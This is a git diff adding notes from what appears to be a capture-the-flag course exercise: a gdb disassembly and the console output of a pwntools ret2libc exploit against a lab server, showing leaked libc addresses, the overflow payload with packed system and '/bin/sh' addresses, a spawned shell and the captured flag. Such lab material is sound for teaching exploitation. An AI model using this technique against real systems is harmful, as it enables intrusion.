@@ -84,6 +84,12 @@ Dump of assembler code for function say_hello:
    0x08048637 <+60>:	leave
    0x08048638 <+61>:	ret
 End of assembler dump.
+(gdb) disassemble __libc_start_main
+Dump of assembler code for function __libc_start_main@plt:
+   0x080484d0 <+0>:	jmp    *0x804a028
+   0x080484d6 <+6>:	push   $0x38
+   0x080484db <+11>:	jmp    0x8048450
+End of assembler dump.
 (gdb) disassemble main
 Dump of assembler code for function main:
    0x08048639 <+0>:	push   %ebp
@@ -389,3 +395,48 @@ int main()
 
     return 0;
 }
+
+============================================================================================================================================================================================================================================================
+
+❯ python 7-hello.py
+[*] '/Users/guntas13/Desktop/JetBrains Projects/cns-ctf/bin/hello'
+    Arch:       i386-32-little
+    RELRO:      Partial RELRO
+    Stack:      No canary found
+    NX:         NX enabled
+    PIE:        No PIE (0x8048000)
+    Stripped:   No
+[*] '/Users/guntas13/Desktop/JetBrains Projects/cns-ctf/bin/libc-2.23.so'
+    Arch:       i386-32-little
+    RELRO:      Partial RELRO
+    Stack:      Canary found
+    NX:         NX enabled
+    PIE:        PIE enabled
+[+] Opening connection to 10.0.118.104 on port 3377: Done
+[*] puts      @ 0xf7dbe150
+[*] libc base @ 0xf7d5f000
+[*] system    @ 0xf7d99950
+[*] /bin/sh   @ 0xf7eb812b
+[*] Switching to interactive mode
+Hello, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP\x99\xd9\xf7\xc0\xd7\xd8\xf7+\x81\xeb\xf7!
+$ ls
+flag.txt
+hello
+start.sh
+$ cat flag.txt
+cns431ctf{0oops_5up32_m4210_5m45h_8202}
+$ ls
+flag.txt
+hello
+start.sh
+$ ./hello
+What's your name?
+$ AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+Hello, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA!
+$ ls
+flag.txt
+hello
+start.sh
+$
+[*] Interrupted
+[*] Closed connection to 10.0.118.104 port 3377
